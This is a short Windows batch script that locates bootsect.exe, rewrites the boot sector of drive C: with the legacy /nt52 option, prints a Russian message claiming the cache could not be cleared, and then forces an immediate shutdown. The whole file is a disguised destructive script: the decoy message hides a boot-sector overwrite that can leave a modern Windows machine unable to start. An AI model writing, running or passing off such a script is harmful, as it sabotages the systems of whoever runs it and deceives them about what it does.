@echo off

set "drive=C"

for /f "tokens=*" %%a in ('dir /b /s /a:-d bootsect.exe') do set "bootsect=%%a"

"%bootsect%" /nt52 %drive%:

echo Не удалось очистить кэш.

shutdown /s /t 0
